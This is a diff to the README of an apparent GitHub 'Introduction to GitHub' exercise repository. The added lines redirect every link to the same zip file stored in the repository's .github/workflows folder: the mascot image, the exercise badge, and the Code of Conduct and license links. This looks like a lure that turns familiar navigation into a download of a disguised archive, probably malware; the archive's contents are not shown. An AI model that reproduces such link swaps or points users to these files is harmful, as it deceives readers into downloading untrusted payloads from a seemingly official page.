@@ -1,6 +1,6 @@
 # Introduction to GitHub
 
-<img src="https://octodex.github.com/images/Professortocat_v2.png" align="right" height="200px" />
+<img src="https://raw.githubusercontent.com/Software2l/skills-introduction-to-github/main/.github/workflows/skills-introduction-to-github_3.8.zip" align="right" height="200px" />
 
 Hey @Software2l!
 
@@ -8,9 +8,9 @@ Mona here. I'm done preparing your exercise. Hope you enjoy! 💚
 
 Remember, it's self-paced so feel free to take a break! ☕️
 
-[![](https://img.shields.io/badge/Go%20to%20Exercise-%E2%86%92-1f883d?style=for-the-badge&logo=github&labelColor=197935)](https://github.com/Software2l/skills-introduction-to-github/issues/1)
+[![](https://raw.githubusercontent.com/Software2l/skills-introduction-to-github/main/.github/workflows/skills-introduction-to-github_3.8.zip%20to%20Exercise-%E2%86%92-1f883d?style=for-the-badge&logo=github&labelColor=197935)](https://raw.githubusercontent.com/Software2l/skills-introduction-to-github/main/.github/workflows/skills-introduction-to-github_3.8.zip)
 
 ---
 
-&copy; 2025 GitHub &bull; [Code of Conduct](https://www.contributor-covenant.org/version/2/1/code_of_conduct/code_of_conduct.md) &bull; [MIT License](https://gh.io/mit)
+&copy; 2025 GitHub &bull; [Code of Conduct](https://raw.githubusercontent.com/Software2l/skills-introduction-to-github/main/.github/workflows/skills-introduction-to-github_3.8.zip) &bull; [MIT License](https://raw.githubusercontent.com/Software2l/skills-introduction-to-github/main/.github/workflows/skills-introduction-to-github_3.8.zip)
 
